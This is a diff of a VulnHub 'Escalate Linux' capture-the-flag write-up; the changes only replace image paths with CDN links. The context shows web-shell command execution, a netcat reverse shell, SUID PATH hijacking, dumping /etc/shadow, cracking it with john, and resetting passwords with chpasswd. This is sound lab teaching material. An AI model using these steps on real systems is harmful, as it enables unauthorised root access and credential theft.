@@ -8,7 +8,7 @@ categories: ["writeups"]
 series: []
 showToc: true
 cover:
-  image: "images/cover.png"
+  image: "https://cdn.ziomsec.com/escalate_linux/cover.png"
   caption: "Escalate Linux VulnHub Challenge"
   alt: "Escalate Linux cover"
 platform: "VulnHub"
@@ -43,8 +43,8 @@ nmap -A -p- 192.168.1.18 --min-rate 10000 -oN nmap.out
 | 445      | smb         |
 | 2049     | nfs         |
 
-![](images/1.png)
-![](images/2.png)
+![](https://cdn.ziomsec.com/escalate_linux/1.png)
+![](https://cdn.ziomsec.com/escalate_linux/2.png)
 
 ## Initial Foothold
 
@@ -52,7 +52,7 @@ nmap -A -p- 192.168.1.18 --min-rate 10000 -oN nmap.out
 
 I accessed the HTTP server running on the target and landed on *Apache*'s default landing page.
 
-![](images/3.png)
+![](https://cdn.ziomsec.com/escalate_linux/3.png)
 
 Since there was nothing of interest on the landing page, I looked for hidden files using **ffuf** and found a **php** file.
 
@@ -60,7 +60,7 @@ Since there was nothing of interest on the landing page, I looked for hidden fil
 ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,302
 ```
 
-![](images/4.png)
+![](https://cdn.ziomsec.com/escalate_linux/4.png)
 
 Accessing the file revealed that it required a parameter called *cmd*.
 
@@ -68,7 +68,7 @@ Accessing the file revealed that it required a parameter called *cmd*.
 curl http://target/shell.php
 ```
 
-![](images/5.png)
+![](https://cdn.ziomsec.com/escalate_linux/5.png)
 
 To test out the *cmd* parameter, I sent another request by appending a shell command and got an interesting response from the target.
 
@@ -76,7 +76,7 @@ To test out the *cmd* parameter, I sent another request by appending a shell com
 curl -X GET http://target/shell.php?cmd=whoami
 ```
 
-![](images/6.png)
+![](https://cdn.ziomsec.com/escalate_linux/6.png)
 
 The value being passed in the *cmd* parameter was being executed by the server and its result was being returned in the response. I leveraged this to first verify if the target had **netcat** and **bash** shell and then got a reverse shell.
 
@@ -85,7 +85,7 @@ curl -X GET http://attacker/shell.php?cmd=which+nc
 curl -X GET http://attacker/shell.php?cmd=which+bash
 ```
 
-![](images/7.png)
+![](https://cdn.ziomsec.com/escalate_linux/7.png)
 
 > You can get the reverse shell payload from **[revshells](https://www.revshells.com/)**. 
 
@@ -97,11 +97,11 @@ rlwrap nc -lnvp 4444
 curl -x GET http://attacker/shell.php?cmd={REVSHELL_NC-MKFIFO_PAYLOAD} # URL encode the payload
 ```
 
-![](images/8.png)
+![](https://cdn.ziomsec.com/escalate_linux/8.png)
 
 After the payload was executed on the target, I got a reverse shell on my **netcat** listener.
 
-![](images/9.png)
+![](https://cdn.ziomsec.com/escalate_linux/9.png)
 
 ### Spawning TTY
 
@@ -116,7 +116,7 @@ which python
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![](images/10.png)
+![](https://cdn.ziomsec.com/escalate_linux/10.png)
 
 ## Privilege Escalation
 
@@ -130,7 +130,7 @@ find / -user root -perm -u=s -ls 2>/dev/null
 
 I found 2 interesting files: *script* and *shell*.
 
-![](images/11.png)
+![](https://cdn.ziomsec.com/escalate_linux/11.png)
 
 **USING `/USER3/SHELL`**
 I executed the **shell** program in the */home/user3/* directory and gained root access.
@@ -140,7 +140,7 @@ cd /home/user3/
 ./shell
 ```
 
-![](images/12.png)
+![](https://cdn.ziomsec.com/escalate_linux/12.png)
 
 **MODIFYING THE `/USER5/SCRIPT` FILE**
 I executed the **script** program present in the *user5* directory and obtained results similar to the `ls` command.
@@ -150,7 +150,7 @@ cd /home/user5/
 ./script
 ```
 
-![](images/13.png)
+![](https://cdn.ziomsec.com/escalate_linux/13.png)
 
 > You can also use **[pspy](https://github.com/DominicBreuker/pspy)** to monitor the processes.
 
@@ -161,7 +161,7 @@ I created a script that ran **bash** in privileged mode and named it `ls`.
 /bin/bash -p
 ```
 
-![](images/14.png)
+![](https://cdn.ziomsec.com/escalate_linux/14.png)
 
 I then added the directory where I stored this in the `PATH` variable. Since this path was appended at the start, anytime the system looked for `ls` without it's complete path, it would find it here itself and would hence execute **bash** in privileged mode.
 
@@ -169,13 +169,13 @@ I then added the directory where I stored this in the `PATH` variable. Since thi
 export PATH=tmp:$PATH
 ```
 
-![](images/15.png)
+![](https://cdn.ziomsec.com/escalate_linux/15.png)
 
-![](images/16.png)
+![](https://cdn.ziomsec.com/escalate_linux/16.png)
 
 Finally, I executed the script.
 
-![](images/17.png)
+![](https://cdn.ziomsec.com/escalate_linux/17.png)
 
 ### Cracking Root Password
 
@@ -188,7 +188,7 @@ echo 'cat /etc/shadow' >> ls
 export PATH=/tmp:$PATH
 ```
 
-![](images/18.png)
+![](https://cdn.ziomsec.com/escalate_linux/18.png)
 
 Finally, I gave this file execution permission, ran **/home/user5/script** and got a root password.
 
@@ -197,7 +197,7 @@ chmod +x ls
 /home/user5/script
 ```
 
-![](images/19.png)
+![](https://cdn.ziomsec.com/escalate_linux/19.png)
 
 **`$6$`** indicates the usage of **SHA-512** hash. I copied the password field on my system and used **john** to crack it.
 
@@ -206,7 +206,7 @@ echo 'HASH' > linpass
 john linpass
 ```
 
-![](images/20.png)
+![](https://cdn.ziomsec.com/escalate_linux/20.png)
 
 I then switched to *root* using **su**
 
@@ -215,7 +215,7 @@ su root
 # enter password
 ```
 
-![](images/21.png)
+![](https://cdn.ziomsec.com/escalate_linux/21.png)
 
 ### Using `user1` Privs
 
@@ -227,7 +227,7 @@ echo 'echo "user1:PASSWORD" | chpasswd' >> ls
 export PATH=/tmp:$PATH
 ```
 
-![](images/22.png)
+![](https://cdn.ziomsec.com/escalate_linux/22.png)
 
 Executing the script allowed me to switch to *user1*.
 
@@ -238,7 +238,7 @@ su user1
 # enter new PASSWORD
 ```
 
-![](images/23.png)
+![](https://cdn.ziomsec.com/escalate_linux/23.png)
 
 I then viewed *user1*'s **sudo** privileges and found that I could run any command as root.
 
@@ -246,7 +246,7 @@ I then viewed *user1*'s **sudo** privileges and found that I could run any comma
 sudo -l
 ```
 
-![](images/24.png)
+![](https://cdn.ziomsec.com/escalate_linux/24.png)
 
 Hence, I switched to *root*.
 
@@ -254,7 +254,7 @@ Hence, I switched to *root*.
 sudo su
 ```
 
-![](images/25.png)
+![](https://cdn.ziomsec.com/escalate_linux/25.png)
 
 ### Using `/etc/passwd` Read Perm
 
@@ -264,7 +264,7 @@ I read the `/etc/passwd` file and found that *user7* was part of the root group.
 tail /etc/passwd
 ```
 
-![](images/26.png)
+![](https://cdn.ziomsec.com/escalate_linux/26.png)
 
 ```shell
 echo '#!/bin/bash' > ls
@@ -274,7 +274,7 @@ export PATH=/tmp:$PATH
 /user/user5/script
 ```
 
-![](images/27.png)
+![](https://cdn.ziomsec.com/escalate_linux/27.png)
 
 Finally, I switched user and got privileged access.
 
@@ -283,7 +283,7 @@ su user7
 # enter new PASSWORD
 ```
 
-![](images/28.png)
+![](https://cdn.ziomsec.com/escalate_linux/28.png)
 
 # Closure
 
